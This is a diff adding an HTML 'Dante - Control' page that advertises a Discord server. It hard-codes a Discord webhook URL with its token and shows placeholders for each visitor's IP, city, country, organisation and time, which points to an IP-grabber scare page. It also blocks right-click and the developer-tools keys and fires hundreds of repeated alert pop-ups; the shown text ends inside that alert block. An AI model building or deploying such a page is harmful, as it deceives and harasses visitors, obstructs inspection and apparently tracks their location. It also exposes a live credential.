@@ -1,0 +1,2259 @@
+    <script>
+        const dante_dis_88h_discord_Webhook = "https://discord.com/api/webhooks/1323605719177629768/10QhAw8faXqGrLbvugxIxgpKr-GEBvy24rZbTIefOuK_u1sgOkaiBiHINNHV9EeFl1Sf";
+        const dante_dis_88h_BackGround_Img = "https://cdn.discordapp.com/attachments/1243318795829776484/1340031109471141938/15380014ea4bf9c220a3d9c6314ceac0.jpg?ex=684a7779&is=684925f9&hm=731f0b0c6dfd12fcde0e829a56e2ec428f4420f541da0afd8cf76b5dec92acb7&";
+        const dante_dis_88h_Img_69 = "https://cdn.discordapp.com/attachments/1243318795829776484/1340031108796121119/2f94086d9d8d7616090e8dabb8e17ff7.gif?ex=684a7778&is=684925f8&hm=af123600a4f1da44722588f4823189bedc9db0e6ddb964e3052ea49dfb2afe3d&";
+        const dante_dis_88h_loading_img = "https://i.pinimg.com/originals/2f/d6/df/2fd6df147fcb28699d340a6cf34958a3.gif";
+        const dante_dis_88h_screamSound = "https://audio.jukehost.co.uk/JxIl7UvL5luLKppBPbCnGF0CCPzjOJjM"; // يمكنك تغييره لصوت أكثر رعبًا
+        const dante_dis_88h_loading_Text = "Loading your fate...";
+
+
+        const dante_dis_88h_DanteIsHere = "[ Dante is here ]";
+        const dante_dis_88h_DanteIsHere2 = "For Free ||  discord.gg/88h";
+        
+    </script>
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Dante - Control</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- روابط مركزية للصور والصوت -->
+
+
+    <style>
+        :root {
+            --main-color: #a58aff;
+            --secondary-bg: rgba(0, 0, 0, 0.726);
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            background-color: var(--secondary-bg);
+            background-image: url("");
+            background-size: cover;
+            background-position: center;
+            color: white;
+        }
+
+        /* شاشة التحميل */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: black;
+            color: red;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            font-family: 'Courier New', monospace;
+            font-size: 2em;
+            animation: glitch-text 1s infinite;
+        }
+
+        @keyframes glitch-text {
+            0% { text-shadow: 2px 2px red; }
+            20% { text-shadow: -2px -2px lime; }
+            40% { text-shadow: 2px -2px blue; }
+            60% { text-shadow: -2px 2px yellow; }
+            80% { text-shadow: 0 0 5px red; }
+            100% { text-shadow: 2px 2px red; }
+        }
+
+        .hide-loading {
+            animation: fadeOut 2s forwards;
+        }
+
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+
+        /* التصميم الرئيسي */
+        .container {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .img_69 {
+            height: 35%;
+            width: 350px;
+            background-repeat: no-repeat;
+            background-size: contain;
+            background-position: center;
+            border-radius: 30px;
+            background: rgba(153, 1, 1, 0.055);
+            border: 2px solid #440000;
+            box-shadow: 0px 0px 20px #fb0000;
+            margin-top: 30px;
+        }
+
+        .hacked-message {
+            width: 50%;
+            height: 30%;
+            margin-left: 25%;
+            margin-top: 10px;
+            padding: 20px;
+            border-radius: 30px;
+            background: rgba(0, 0, 0, 0.356);
+            border: 2px solid #00000049;
+            box-shadow: 0px 0px 20px #000000;
+        }
+
+        .hacked-message p {
+            font-size: 1.5em;
+            margin: 10px 0;
+        }
+
+        .ip-address, .local-address, .city-address,
+        .Country-address, .org-address, .dateTime-address {
+            font-size: 1.2em;
+            font-weight: bold;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- شاشة التحميل -->
+    <div id="loading" class="loading-screen">
+        <img id="loading_img"src="">
+       <h1><span id="Text_loadingScreen"></span></h1> 
+    </div>
+
+    <!-- محتوى الصفحة -->
+    <div class="container" id="mainContent" style="display:none;">
+        <img class="img_69" id="img69" src="" alt="">
+        <div class="hacked-message">
+            <p><span id="Text_Title"></span></p>
+            <p><span id="Text_Title2"></span></p>
+            <div class="ip-address" id="ip-address">Your IP: ...</div>
+            <div class="local-address" id="local-address">Your Local: ...</div>
+            <div class="city-address" id="city-address">Your City: ...</div>
+            <div class="Country-address" id="Country-address">Your Country: ...</div>
+            <div class="org-address" id="org-address">Your org: ...</div>
+            <div class="dateTime-address" id="dateTime-address">Date Time: ...</div>
+        </div>
+    </div>
+
+    <!-- صوت مرعب -->
+    <audio id="scream" autoplay>
+        <source src="" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+// منع F12
+document.addEventListener('keydown', function (event) {
+    if (
+        event.key === "F12" ||
+        (event.ctrlKey && event.shiftKey && (event.key === "I" || event.key === "J")) ||
+        (event.ctrlKey && event.key === "U")
+    ) {
+        event.preventDefault();
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
